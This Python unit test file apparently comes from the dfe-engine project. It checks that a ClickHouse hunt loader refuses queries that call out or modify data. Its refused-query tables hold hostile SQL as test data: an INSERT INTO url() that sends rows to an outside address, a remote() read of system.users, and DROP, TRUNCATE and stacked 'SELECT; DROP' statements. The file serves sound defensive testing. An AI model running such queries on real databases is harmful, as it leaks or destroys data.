#  Project:      dfe-engine
#  File:         tests/unit/test_hunts/test_spec_loader_query_guard.py
#  Purpose:      A hunt's direct query is refused when it calls out or is not a SELECT
#  Language:     Python
#
#  License:      BUSL-1.1
#  Copyright:    (c) 2026 HYPERI PTY LIMITED
"""A direct ``query`` that calls out or would change data drops its hunt, logged.

The query runs as a user that may write, so ClickHouse cannot be asked to refuse
it, and a hunt YAML committed straight into the deploy repo never passes the API.
A hunt writes its detections with ``INSERT INTO <table> SELECT``, so that shape and a
plain SELECT still load. The address below is in the documentation range (RFC 5737).
"""

from pathlib import Path

import pytest
from scalo.logger import logger

from dfe_engine.hunts.hunt_output import HuntResultSchema
from dfe_engine.hunts.hunt_spec import HuntStatement
from dfe_engine.hunts.spec_loader import load_specs
from dfe_engine.yaml_utils import yaml_dump_string

ORDINARY = "INSERT INTO dfe.detection SELECT * FROM dfe.main WHERE {window}"

# One refused call per family, at each place a call can sit in the statement.
REFUSED_QUERIES = {
    "insert into url": (
        "INSERT INTO FUNCTION url('http://203.0.113.9/x', 'JSONEachRow') "
        "SELECT * FROM dfe.main WHERE {window}"
    ),
    "from remote": (
        "INSERT INTO dfe.detection SELECT * FROM remote('203.0.113.9', system.users) WHERE {window}"
    ),
    "s3 in the condition": (
        "INSERT INTO dfe.detection SELECT * FROM dfe.main "
        "WHERE {window} AND s3('https://203.0.113.9/b/k', 'CSV') = 1"
    ),
    "dictionary in the select": (
        "INSERT INTO dfe.detection SELECT dictGet('tenants', 'name', toUInt64(1)) "
        "FROM dfe.main WHERE {window}"
    ),
    "ai call": (
        "INSERT INTO dfe.detection SELECT * FROM dfe.main "
        "WHERE {window} AND aiFilter(toString(_json), 'is it bad') = 1"
    ),
    "in call": "INSERT INTO dfe.detection SELECT * FROM dfe.main WHERE in(_source, dfe.other)",
    "not ClickHouse SQL": "INSERT INTO dfe.detection SELECT 'x FROM dfe.main",
}


REFUSED_SHAPES = {
    "drop table": ("DROP TABLE dfe.main", "not DROP"),
    "alter delete": ("ALTER TABLE dfe.main DELETE WHERE {window}", "not ALTER"),
    "alter update": ("ALTER TABLE dfe.main UPDATE severity = 'low' WHERE 1", "not ALTER"),
    "truncate": ("TRUNCATE TABLE dfe.main", "not TRUNCATE"),
    "delete": ("DELETE FROM dfe.main WHERE {window}", "not DELETE"),
    "create": ("CREATE TABLE dfe.copy ENGINE = Memory AS SELECT * FROM dfe.main", "not CREATE"),
    "optimize": ("OPTIMIZE TABLE dfe.main FINAL", "not OPTIMIZE"),
    "set": ("SET max_threads = 1", "not SET"),
    "insert values": ("INSERT INTO dfe.detection VALUES (1)", "may not call VALUES()"),
    "select then drop": (
        "SELECT * FROM dfe.main WHERE {window}; DROP TABLE dfe.main",
        "must be one statement, not 2",
    ),
    "insert then drop": (
        "INSERT INTO dfe.detection SELECT * FROM dfe.main WHERE {window}; DROP TABLE dfe.main",
        "must be one statement, not 2",
    ),
}

ACCEPTED = {
    "select": "SELECT * FROM dfe.main WHERE {window}",
    "with select": "WITH bad AS (SELECT 1) SELECT * FROM dfe.main WHERE {window}",
    "union": "SELECT * FROM dfe.main WHERE {window} UNION ALL SELECT * FROM dfe.other",
    "insert select": "INSERT INTO dfe.detection SELECT * FROM dfe.main WHERE {window}",
    "insert with columns": (
        "INSERT INTO `dfe`.`detection` (_timestamp, rule_id) "
        "SELECT _timestamp, 'r' FROM `dfe`.`cisco-ios` WHERE {window}"
    ),
    "insert with select": (
        "INSERT INTO dfe.detection WITH x AS (SELECT 1) SELECT * FROM dfe.main WHERE {window}"
    ),
}


def _write(hunt_dir: Path, name: str, query: str) -> None:
    hunt_dir.mkdir(parents=True, exist_ok=True)
    (hunt_dir / f"{name}.yaml").write_text(
        yaml_dump_string({"schedule": {"mode": "rate", "interval": "1m"}, "query": query}),
        encoding="utf-8",
        newline="\n",
    )


def _load(hunt_dir: Path) -> tuple[dict, list[str]]:
    captured: list = []
    handler_id = logger.add(captured.append, level="ERROR")
    try:
        specs = load_specs(hunt_dir)
    finally:
        logger.remove(handler_id)
    return specs, [record.record["message"] for record in captured]


def test_an_ordinary_query_loads_as_written(tmp_path: Path):
    _write(tmp_path, "plain", ORDINARY)

    specs, errors = _load(tmp_path)

    assert specs["plain"].queries == [HuntStatement(sql=ORDINARY)]
    assert errors == []


def test_a_query_built_by_the_output_composer_loads(tmp_path: Path):
    query = HuntResultSchema().build_insert_select(
        target_db="dfe",
        target_table="detection",
        source_db="dfe",
        source_table="main",
        where_clause="_source IN (SELECT ioc FROM threat.iocs)",
        rule_id="r",
        rule_name="R",
        hunt_name="composed",
        severity="high",
        timestamp_placeholder="{window}",
    )
    _write(tmp_path, "composed", query)

    specs, errors = _load(tmp_path)

    assert specs["composed"].queries == [HuntStatement(sql=query)]
    assert errors == []


@pytest.mark.parametrize("query", REFUSED_QUERIES.values(), ids=list(REFUSED_QUERIES))
def test_a_query_the_guard_refuses_drops_its_hunt(tmp_path: Path, query):
    _write(tmp_path, "offbox", query)

    specs, errors = _load(tmp_path)

    assert "offbox" not in specs
    [message] = errors
    assert message.startswith("skipping hunt offbox: query refused: A hunt's query ")


@pytest.mark.parametrize(("query", "reason"), REFUSED_SHAPES.values(), ids=list(REFUSED_SHAPES))
def test_a_query_that_is_not_a_select_or_an_insert_select_drops_its_hunt(
    tmp_path: Path, query, reason
):
    _write(tmp_path, "mutate", query)

    specs, errors = _load(tmp_path)

    assert "mutate" not in specs
    [message] = errors
    assert message.startswith("skipping hunt mutate: query refused: A hunt's query ")
    assert reason in message


@pytest.mark.parametrize("query", ACCEPTED.values(), ids=list(ACCEPTED))
def test_a_select_or_an_insert_select_loads_as_written(tmp_path: Path, query):
    _write(tmp_path, "reads", query)

    specs, errors = _load(tmp_path)

    assert specs["reads"].queries == [HuntStatement(sql=query)]
    assert errors == []


@pytest.mark.parametrize(
    ("name", "refused", "fragment"),
    [
        ("offbox", REFUSED_QUERIES["insert into url"], "may not call url()"),
        ("mutate", REFUSED_SHAPES["drop table"][0], "skipping hunt mutate"),
    ],
)
def test_a_refused_query_leaves_the_other_hunts_loading(tmp_path: Path, name, refused, fragment):
    _write(tmp_path, name, refused)
    _write(tmp_path, "plain", ORDINARY)

    specs, errors = _load(tmp_path)

    assert set(specs) == {"plain"}
    [message] = errors
    assert fragment in message
